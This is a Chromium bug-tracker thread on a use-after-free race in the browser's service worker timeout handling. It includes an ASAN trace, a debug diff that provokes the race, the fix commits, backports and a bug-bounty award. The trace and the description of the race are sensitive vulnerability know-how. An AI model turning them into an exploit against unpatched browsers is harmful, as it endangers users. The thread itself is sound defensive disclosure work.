
### ch...@google.com (2025-08-23)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2025-08-23)

Setting Priority to P0 to match Severity s0. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### yy...@google.com (2025-08-25)

Unfortunately, I also cannot reproduce.
I built Chromium with:

```
is_debug = false
is_asan = true
is_component_build = false
dcheck_always_on = true

```

commit 54c77c7eab08d36bacba8f12be0210102ef5cca0

I built by myself on Linux. Copy&paste the code and run with local node.

```
$ out/Default/chrome http://localhost:12345

```

I left the chrome as-is for 10 minutes after this.
However, to trigger timeout, I may need to reduce the timer.

### yy...@google.com (2025-08-25)

More likely to timeout with this:

```
diff --git a/content/browser/service_worker/service_worker_version.h b/content/browser/service_worker/service_worker_version.h
index 2783218a27f76..47645ecec71c5 100644
--- a/content/browser/service_worker/service_worker_version.h
+++ b/content/browser/service_worker/service_worker_version.h
@@ -752,7 +752,7 @@ class CONTENT_EXPORT ServiceWorkerVersion
   }
 
   // Timeout for a request to be handled.
-  static constexpr base::TimeDelta kRequestTimeout = base::Minutes(5);
+  static constexpr base::TimeDelta kRequestTimeout = base::Seconds(5);
 
   base::WeakPtr<ServiceWorkerVersion> GetWeakPtr();
 
@@ -894,7 +894,7 @@ class CONTENT_EXPORT ServiceWorkerVersion
   // The timeout timer interval.
   static constexpr base::TimeDelta kTimeoutTimerDelay = base::Seconds(30);
   // Timeout for a new worker to start.
-  static constexpr base::TimeDelta kStartNewWorkerTimeout = base::Minutes(5);
+  static constexpr base::TimeDelta kStartNewWorkerTimeout = base::Seconds(5);
   // Timeout for the worker to stop.
   static constexpr base::TimeDelta kStopWorkerTimeout = base::Seconds(5);

```

Ok, crashed with DCHECK().

```
[1650544:1650544:0825/060319.333618:FATAL:content/browser/service_worker/service_worker_version.cc:780] DCHECK failed: request_timeouts_.size() == inflight_requests_.size() (1 vs. 2)

```

This should be what you meant.

### yy...@google.com (2025-08-25)

By the way, I checked the code found a code comment saying [crbug.com/40864997](https://crbug.com/40864997). Is the crash mechanism same?

### lo...@gmail.com (2025-08-25)

I have no access to crbug.com/40864997, so I don't know if that's related to this bug or not.

### yy...@google.com (2025-08-25)

I added you to it. Now you should have the access.

### lo...@gmail.com (2025-08-25)

Thanks Yoshisato. I have had a quick look at crbug.com/40864997 . The crash stack is similar, except its crash stack starts wtih MultiplexRouter::OnPipeConnectionError().

However, I've managed to crafted a new PoC (UAF_FinishRequestWithFetchCount_PoC_OnPipeConnectionError.js) of which the crash stack starts with MultiplexRouter::OnPipeConnectionError(). Crash state and ASAN report have been collected and attached here.

What we can do, is probably just fix the bug from this report, and keep an eye on the crash stats once the fix is released. If the volume of the crash report goes down and no more crash report from the new version and above, then they are the same issue.

=================================================================
==37400==ERROR: AddressSanitizer: heap-use-after-free on address 0x1197f7be4748 at pc 0x7ff995df63f7 bp 0x005f5b3fa040 sp 0x005f5b3fa088
READ of size 8 at 0x1197f7be4748 thread T0
    #0 0x7ff995df63f6 in std::__Cr::__tree_next_iter C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__tree:191
    #1 0x7ff995df63f6 in std::__Cr::__tree_iterator<content::ServiceWorkerVersion::InflightRequestTimeoutInfo,std::__Cr::__tree_node<content::ServiceWorkerVersion::InflightRequestTimeoutInfo,void *> *,long long>::operator++ C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__tree:655
    #2 0x7ff995df63f6 in std::__Cr::__tree<content::ServiceWorkerVersion::InflightRequestTimeoutInfo,std::__Cr::less<content::ServiceWorkerVersion::InflightRequestTimeoutInfo>,std::__Cr::allocator<content::ServiceWorkerVersion::InflightRequestTimeoutInfo> >::__remove_node_pointer C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__tree:1807
    #3 0x7ff995df63f6 in std::__Cr::__tree<content::ServiceWorkerVersion::InflightRequestTimeoutInfo,std::__Cr::less<content::ServiceWorkerVersion::InflightRequestTimeoutInfo>,std::__Cr::allocator<content::ServiceWorkerVersion::InflightRequestTimeoutInfo> >::erase C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__tree:1937
    #4 0x7ff995df63f6 in std::__Cr::set<content::ServiceWorkerVersion::InflightRequestTimeoutInfo,std::__Cr::less<content::ServiceWorkerVersion::InflightRequestTimeoutInfo>,std::__Cr::allocator<content::ServiceWorkerVersion::InflightRequestTimeoutInfo> >::erase C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\set:772
    #5 0x7ff995df63f6 in content::ServiceWorkerVersion::FinishRequestWithFetchCount(int, bool, unsigned int) C:\b\s\w\ir\cache\builder\src\content\browser\service_worker\service_worker_version.cc:852:21
    #6 0x7ff995c78770 in base::internal::DecayedFunctorTraits<void (ResponseCallback::*)(),content::ServiceWorkerFetchDispatcher::ResponseCallback *>::Invoke C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:731
    #7 0x7ff995c78770 in base::internal::InvokeHelper<0,base::internal::FunctorTraits<void (ResponseCallback::*&&)(),content::ServiceWorkerFetchDispatcher::ResponseCallback *>,void,0>::MakeItSo C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:923
    #8 0x7ff995c78770 in base::internal::Invoker<base::internal::FunctorTraits<void (ResponseCallback::*&&)(),content::ServiceWorkerFetchDispatcher::ResponseCallback *>,base::internal::BindState<1,1,0,void (ResponseCallback::*)(),base::internal::UnretainedWrapper<content::ServiceWorkerFetchDispatcher::ResponseCallback,base::unretained_traits::MayNotDangle,0> >,void ()>::RunImpl C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:1060
    #9 0x7ff995c78770 in base::internal::Invoker<struct base::internal::FunctorTraits<void (__cdecl content::ServiceWorkerFetchDispatcher::ResponseCallback::*&&)(void), class content::ServiceWorkerFetchDispatcher::ResponseCallback *>, struct base::internal::BindState<1, 1, 0, void (__cdecl content::ServiceWorkerFetchDispatcher::ResponseCallback::*)(void), class base::internal::UnretainedWrapper<class content::ServiceWorkerFetchDispatcher::ResponseCallback, struct base::unretained_traits::MayNotDangle, 0>>, (void)>::RunOnce(class base::internal::BindStateBase *) C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:973:12
    #10 0x7ff99dfeffcb in base::OnceCallback<void ()>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:156
    #11 0x7ff99dfeffcb in mojo::InterfaceEndpointClient::NotifyError(class std::__Cr::optional<struct mojo::DisconnectReason> const &) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:769:31
    #12 0x7ff99dfd3e33 in mojo::internal::MultiplexRouter::ProcessNotifyErrorTask(struct mojo::internal::MultiplexRouter::Task *, enum mojo::internal::MultiplexRouter::ClientCallBehavior, class base::SequencedTaskRunner *) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:1034:13
    #13 0x7ff99dfca294 in mojo::internal::MultiplexRouter::ProcessTasks(enum mojo::internal::MultiplexRouter::ClientCallBehavior, class base::SequencedTaskRunner *) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:947:15
    #14 0x7ff99dfc4752 in mojo::internal::MultiplexRouter::OnPipeConnectionError(bool) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:856:3
    #15 0x7ff99dfd71b8 in base::internal::DecayedFunctorTraits<void (MultiplexRouter::*)(bool),mojo::internal::MultiplexRouter *,bool &&>::Invoke C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:731

...

### yy...@google.com (2025-08-26)

Thank you for the PoC. I ran it and saw DCHECK hit by that. Yeah, the same DCHECK.
I confirmed it has been fixed by:
<https://chromium-review.googlesource.com/c/chromium/src/+/6875344>

### dx...@google.com (2025-08-27)

Project: chromium/src  

Branch:  main  

Author:  Yoshisato Yanagisawa [yyanagisawa@chromium.org](mailto:yyanagisawa@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6875344>

Fix race condition in ServiceWorkerVersion::OnTimeoutTimer

---


Expand for full commit details
```
     
    A race condition between handling request timeouts and starting new 
    requests could lead to memory corruption issues, such as the 
    use-after-free reported in the initial security bug. Specifically, if an 
    error callback for a timed-out request triggers a new fetch request, 
    the timeout info for the new request could be freed while the request is 
    still in flight. 
     
    This change fixes the race by making the timeout handling logic in 
    OnTimeoutTimer re-entrant. It now iterates through the pending 
    requests, moves the timed-out ones to a separate list, and then 
    iterates over that new list to call the callbacks. This 
    ensures that the main request list is not modified while it's being 
    iterated over. 
     
    Additionally, this change fixes a DCHECK failure by ensuring that the 
    inflight_requests_ map is updated before calling the error callback in 
    MaybeTimeoutRequest. This prevents a scenario where the callback could 
    trigger another request to finish, leading to an inconsistent state 
    between the request_timeouts_ and inflight_requests_ maps. 
     
    Bug: 440454442, 40864997 
    Change-Id: Ie3b4a2c1d0f9e8d7c6b5a4f3e2d1c0b9a8d7e6f5 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6875344 
    Reviewed-by: Shunya Shishido <sisidovski@chromium.org> 
    Reviewed-by: Keita Suzuki <suzukikeita@chromium.org> 
    Commit-Queue: Yoshisato Yanagisawa <yyanagisawa@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1506873}

```

---

Files:

- M `content/browser/service_worker/service_worker_version.cc`

---

Hash: [7a2821580c0fd65387c70d432017e31881a90c51](https://chromiumdash.appspot.com/commit/7a2821580c0fd65387c70d432017e31881a90c51)  

Date: Wed Aug 27 01:06:45 2025


---

### yy...@google.com (2025-08-27)

Please verify if [#comment14](https://issues.chromium.org/issues/440454442#comment14) fixes the issue.

### ch...@google.com (2025-08-27)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M138. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M139. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M140. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [138, 139, 140].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### yy...@google.com (2025-08-28)

1. Which CLs should be backmerged? (Please include Gerrit links.)

https://chromium-review.googlesource.com/6875344

2. Has this fix been verified on Canary to not pose any stability regressions?

Yes.

3. Does this fix pose any potential non-verifiable stability risks?

I do not think.  The fix itself is very simple.

4. Does this fix pose any known compatibility risks?

I do not think so.  Although it slightly changed the way to run the timeout timer, the case hit by the location change is the case hitting this issue.  People would rarely notice that.

5. Does it require manual verification by the test team? If so, please describe required testing.

Maybe not.

6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

done.

### am...@chromium.org (2025-08-29)

There are no further planned releases of M138 Extended or M139 Stable, so I've removed those merge tags.

M140 merge approved, please merge <https://crrev.com/c/6875344> to M140 / branch 7339 as soon as possible, so that this fix can go out in the next RC of M140, which will be promoted to Stable next week.

### dx...@google.com (2025-09-01)

Project: chromium/src  

Branch:  refs/branch-heads/7339  

Author:  Yoshisato Yanagisawa [yyanagisawa@chromium.org](mailto:yyanagisawa@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6903322>

[M140] Fix race condition in ServiceWorkerVersion::OnTimeoutTimer

---


Expand for full commit details
```
     
    A race condition between handling request timeouts and starting new 
    requests could lead to memory corruption issues, such as the 
    use-after-free reported in the initial security bug. Specifically, if an 
    error callback for a timed-out request triggers a new fetch request, 
    the timeout info for the new request could be freed while the request is 
    still in flight. 
     
    This change fixes the race by making the timeout handling logic in 
    OnTimeoutTimer re-entrant. It now iterates through the pending 
    requests, moves the timed-out ones to a separate list, and then 
    iterates over that new list to call the callbacks. This 
    ensures that the main request list is not modified while it's being 
    iterated over. 
     
    Additionally, this change fixes a DCHECK failure by ensuring that the 
    inflight_requests_ map is updated before calling the error callback in 
    MaybeTimeoutRequest. This prevents a scenario where the callback could 
    trigger another request to finish, leading to an inconsistent state 
    between the request_timeouts_ and inflight_requests_ maps. 
     
    (cherry picked from commit 7a2821580c0fd65387c70d432017e31881a90c51) 
     
    Bug: 440454442, 40864997 
    Change-Id: Ie3b4a2c1d0f9e8d7c6b5a4f3e2d1c0b9a8d7e6f5 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6875344 
    Reviewed-by: Shunya Shishido <sisidovski@chromium.org> 
    Reviewed-by: Keita Suzuki <suzukikeita@chromium.org> 
    Commit-Queue: Yoshisato Yanagisawa <yyanagisawa@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1506873} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6903322 
    Cr-Commit-Position: refs/branch-heads/7339@{#1652} 
    Cr-Branched-From: 27be8b77710f4405fdfeb4ee946fcabb0f6c92b2-refs/heads/main@{#1496484}

```

---

Files:

- M `content/browser/service_worker/service_worker_version.cc`

---

Hash: [ee4d43b9004ac1de28b053af6b180ea33fb7e4c9](https://chromiumdash.appspot.com/commit/ee4d43b9004ac1de28b053af6b180ea33fb7e4c9)  

Date: Mon Sep 1 06:58:19 2025


---

### pe...@google.com (2025-09-01)

LTS Milestone M138

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### pe...@google.com (2025-09-02)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2025-09-02)

1. <https://chromium-review.googlesource.com/c/chromium/src/+/6905328>
2. Low - There was a few conflict.
3. 140
4. Yes, M138 has similar codebase and the fix could be merged into the branches after modifying a TRACE macro.

### pe...@google.com (2025-09-02)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2025-09-02)

1. <https://chromium-review.googlesource.com/c/chromium/src/+/6905868>
2. Low - There were a few conflict.
3. 140
4. Yes, M132 has similar codebase and the fix could be merged into the branches after modifying a TRACE macro.

### ch...@google.com (2025-09-03)

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), danielyip (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### sp...@google.com (2025-09-03)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $43000.00 for this report.

Rationale for this decision:
$35,000 for high quality memory corruption in a non-sandboxed process + $7,000 for baseline renderer memory corruption (since exploitation does not require renderer m/c) + $1,000 bisect bonus 


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### lo...@gmail.com (2025-09-04)

Thanks Yoshisato and the chrome security team for the quick turnaround. 

I have a question about the added $7,000 renderer amount. Shouldn't it be $10000 given the report is considered high quality? 
On the VRP website, it says "2] Amounts are based on the precondition of a compromised renderer, otherwise the EQUIVALENT renderer reward will also be added.". I thought it would be  $35,000 + $10,000 for high quality, and $25,000 + $7,000 for baseline quality. Is my interpretation here wrong?

### dx...@google.com (2025-09-05)

Project: chromium/src  

Branch:  refs/branch-heads/7258  

Author:  Yoshisato Yanagisawa [yyanagisawa@chromium.org](mailto:yyanagisawa@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6914674>

[M139] Fix race condition in ServiceWorkerVersion::OnTimeoutTimer

---


Expand for full commit details
```
     
    A race condition between handling request timeouts and starting new 
    requests could lead to memory corruption issues, such as the 
    use-after-free reported in the initial security bug. Specifically, if an 
    error callback for a timed-out request triggers a new fetch request, 
    the timeout info for the new request could be freed while the request is 
    still in flight. 
     
    This change fixes the race by making the timeout handling logic in 
    OnTimeoutTimer re-entrant. It now iterates through the pending 
    requests, moves the timed-out ones to a separate list, and then 
    iterates over that new list to call the callbacks. This 
    ensures that the main request list is not modified while it's being 
    iterated over. 
     
    Additionally, this change fixes a DCHECK failure by ensuring that the 
    inflight_requests_ map is updated before calling the error callback in 
    MaybeTimeoutRequest. This prevents a scenario where the callback could 
    trigger another request to finish, leading to an inconsistent state 
    between the request_timeouts_ and inflight_requests_ maps. 
     
    (cherry picked from commit 7a2821580c0fd65387c70d432017e31881a90c51) 
     
    Bug: 440454442, 40864997 
    Change-Id: Ie3b4a2c1d0f9e8d7c6b5a4f3e2d1c0b9a8d7e6f5 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6875344 
    Reviewed-by: Shunya Shishido <sisidovski@chromium.org> 
    Reviewed-by: Keita Suzuki <suzukikeita@chromium.org> 
    Commit-Queue: Yoshisato Yanagisawa <yyanagisawa@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1506873} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6914674 
    Reviewed-by: Yoshisato Yanagisawa <yyanagisawa@chromium.org> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Cr-Commit-Position: refs/branch-heads/7258@{#3392} 
    Cr-Branched-From: f600d0656fd5b5fe4a82981f533d31ed6939e2e4-refs/heads/main@{#1477651}

```

---

Files:

- M `content/browser/service_worker/service_worker_version.cc`

---

Hash: [7790a2dc3bf1071105b5fa8c67daf292116d5e3a](https://chromiumdash.appspot.com/commit/7790a2dc3bf1071105b5fa8c67daf292116d5e3a)  

Date: Fri Sep 5 04:40:34 2025


---

### dx...@google.com (2025-09-09)

Project: chromium/src  

Branch:  refs/branch-heads/7204  

Author:  Yoshisato Yanagisawa [yyanagisawa@chromium.org](mailto:yyanagisawa@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6905328>

[M138-LTS] Fix race condition in ServiceWorkerVersion::OnTimeoutTimer

---


Expand for full commit details
```
     
    A race condition between handling request timeouts and starting new 
    requests could lead to memory corruption issues, such as the 
    use-after-free reported in the initial security bug. Specifically, if an 
    error callback for a timed-out request triggers a new fetch request, 
    the timeout info for the new request could be freed while the request is 
    still in flight. 
     
    This change fixes the race by making the timeout handling logic in 
    OnTimeoutTimer re-entrant. It now iterates through the pending 
    requests, moves the timed-out ones to a separate list, and then 
    iterates over that new list to call the callbacks. This 
    ensures that the main request list is not modified while it's being 
    iterated over. 
     
    Additionally, this change fixes a DCHECK failure by ensuring that the 
    inflight_requests_ map is updated before calling the error callback in 
    MaybeTimeoutRequest. This prevents a scenario where the callback could 
    trigger another request to finish, leading to an inconsistent state 
    between the request_timeouts_ and inflight_requests_ maps. 
     
    (cherry picked from commit 7a2821580c0fd65387c70d432017e31881a90c51) 
     
    Bug: 440454442, 40864997 
    Change-Id: Ie3b4a2c1d0f9e8d7c6b5a4f3e2d1c0b9a8d7e6f5 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6875344 
    Reviewed-by: Shunya Shishido <sisidovski@chromium.org> 
    Reviewed-by: Keita Suzuki <suzukikeita@chromium.org> 
    Commit-Queue: Yoshisato Yanagisawa <yyanagisawa@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1506873} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6905328 
    Reviewed-by: Fahad Mansoor <fahadmansoor@google.com> 
    Reviewed-by: Yoshisato Yanagisawa <yyanagisawa@chromium.org> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Cr-Commit-Position: refs/branch-heads/7204@{#3397} 
    Cr-Branched-From: d5de512dc9dc8ddfe4e6d71b0637578bb6158683-refs/heads/main@{#1465706}

```

---

Files:

- M `content/browser/service_worker/service_worker_version.cc`

---

Hash: [b4e0137916a97a970bab3d6217f52f07850bd047](https://chromiumdash.appspot.com/commit/b4e0137916a97a970bab3d6217f52f07850bd047)  

Date: Tue Sep 9 17:57:45 2025


---

### dx...@google.com (2025-09-10)

Project: chromium/src  

Branch:  refs/branch-heads/6834  

Author:  Yoshisato Yanagisawa [yyanagisawa@chromium.org](mailto:yyanagisawa@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6905868>

[M132-LTS] Fix race condition in ServiceWorkerVersion::OnTimeoutTimer

---


Expand for full commit details
```
     
    A race condition between handling request timeouts and starting new 
    requests could lead to memory corruption issues, such as the 
    use-after-free reported in the initial security bug. Specifically, if an 
    error callback for a timed-out request triggers a new fetch request, 
    the timeout info for the new request could be freed while the request is 
    still in flight. 
     
    This change fixes the race by making the timeout handling logic in 
    OnTimeoutTimer re-entrant. It now iterates through the pending 
    requests, moves the timed-out ones to a separate list, and then 
    iterates over that new list to call the callbacks. This 
    ensures that the main request list is not modified while it's being 
    iterated over. 
     
    Additionally, this change fixes a DCHECK failure by ensuring that the 
    inflight_requests_ map is updated before calling the error callback in 
    MaybeTimeoutRequest. This prevents a scenario where the callback could 
    trigger another request to finish, leading to an inconsistent state 
    between the request_timeouts_ and inflight_requests_ maps. 
     
    (cherry picked from commit 7a2821580c0fd65387c70d432017e31881a90c51) 
     
    Bug: 440454442, 40864997 
    Change-Id: Ie3b4a2c1d0f9e8d7c6b5a4f3e2d1c0b9a8d7e6f5 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6875344 
    Reviewed-by: Shunya Shishido <sisidovski@chromium.org> 
    Reviewed-by: Keita Suzuki <suzukikeita@chromium.org> 
    Commit-Queue: Yoshisato Yanagisawa <yyanagisawa@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1506873} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6905868 
    Reviewed-by: Fahad Mansoor <fahadmansoor@google.com> 
    Reviewed-by: Yoshisato Yanagisawa <yyanagisawa@chromium.org> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Cr-Commit-Position: refs/branch-heads/6834@{#5635} 
    Cr-Branched-From: 47a3549fac11ee8cb7be6606001ede605b302b9f-refs/heads/main@{#1381561}

```

---

Files:

- M `content/browser/service_worker/service_worker_version.cc`

---

Hash: [6d7ab93682576b3cd7a669769eda9c5cca0f1a8e](https://chromiumdash.appspot.com/commit/6d7ab93682576b3cd7a669769eda9c5cca0f1a8e)  

Date: Wed Sep 10 04:33:04 2025


---

### wf...@chromium.org (2025-09-11)

hi re: #27 thanks for your question, the renderer bonus here is 7k. The browser sandbox escape was rewarded $35,000 for being considered high quality report. This, combined with the $1k bonus gives 1+7+35 = 43k. Hope that helps explain!

### lo...@gmail.com (2025-09-12)

Thanks for the reply wfh. My question is about the renderer bonus.
I see the VRP rule says “ EQUIVALENT”.
Isn’t the EQUIVALENT renderer reward for a high quality sandbox escape report $10000? And $7000 is the equivalent renderer bonus for a baseline browser memory corruption, isn’t it?

### dx...@google.com (2025-09-26)

Project: chromium/src  

Branch:  refs/branch-heads/7204\_184  

Author:  Yoshisato Yanagisawa [yyanagisawa@chromium.org](mailto:yyanagisawa@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6986961>

[CfM-M138] Fix race condition in ServiceWorkerVersion::OnTimeoutTimer

---


Expand for full commit details
```
     
    A race condition between handling request timeouts and starting new 
    requests could lead to memory corruption issues, such as the 
    use-after-free reported in the initial security bug. Specifically, if an 
    error callback for a timed-out request triggers a new fetch request, 
    the timeout info for the new request could be freed while the request is 
    still in flight. 
     
    This change fixes the race by making the timeout handling logic in 
    OnTimeoutTimer re-entrant. It now iterates through the pending 
    requests, moves the timed-out ones to a separate list, and then 
    iterates over that new list to call the callbacks. This 
    ensures that the main request list is not modified while it's being 
    iterated over. 
     
    Additionally, this change fixes a DCHECK failure by ensuring that the 
    inflight_requests_ map is updated before calling the error callback in 
    MaybeTimeoutRequest. This prevents a scenario where the callback could 
    trigger another request to finish, leading to an inconsistent state 
    between the request_timeouts_ and inflight_requests_ maps. 
     
    (cherry picked from commit 7a2821580c0fd65387c70d432017e31881a90c51) 
     
    (cherry picked from commit b4e0137916a97a970bab3d6217f52f07850bd047) 
     
    Bug: 440454442, 40864997 
    Change-Id: Ie3b4a2c1d0f9e8d7c6b5a4f3e2d1c0b9a8d7e6f5 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6875344 
    Reviewed-by: Shunya Shishido <sisidovski@chromium.org> 
    Reviewed-by: Keita Suzuki <suzukikeita@chromium.org> 
    Commit-Queue: Yoshisato Yanagisawa <yyanagisawa@chromium.org> 
    Cr-Original-Original-Commit-Position: refs/heads/main@{#1506873} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6905328 
    Reviewed-by: Fahad Mansoor <fahadmansoor@google.com> 
    Reviewed-by: Yoshisato Yanagisawa <yyanagisawa@chromium.org> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Cr-Original-Commit-Position: refs/branch-heads/7204@{#3397} 
    Cr-Original-Branched-From: d5de512dc9dc8ddfe4e6d71b0637578bb6158683-refs/heads/main@{#1465706} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6986961 
    Owners-Override: Kyle Williams <kdgwill@chromium.org> 
    Reviewed-by: Niko Tsirakis <ntsirakis@google.com> 
    Commit-Queue: Kyle Williams <kdgwill@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7204_184@{#51} 
    Cr-Branched-From: 7ea839044480a944888296dc0cccc5afb60b736c-refs/branch-heads/7204@{#2436} 
    Cr-Branched-From: d5de512dc9dc8ddfe4e6d71b0637578bb6158683-refs/heads/main@{#1465706}

```

---

Files:

- M `content/browser/service_worker/service_worker_version.cc`

---

Hash: [cd329f3a15a28480138e65596836d422ff57ca18](https://chromiumdash.appspot.com/commit/cd329f3a15a28480138e65596836d422ff57ca18)  

Date: Fri Sep 26 19:47:44 2025


---

### wf...@chromium.org (2025-10-17)

re: #32 - no, we reward $7 for the renderer bonus here.

### ch...@google.com (2025-12-04)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> $35,000 for high quality memory corruption in a non-sandboxed process + $7,000 for baseline renderer memory corruption (since exploitation does not require renderer m/c) + $1,000 bisect bonus

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/440454442)*
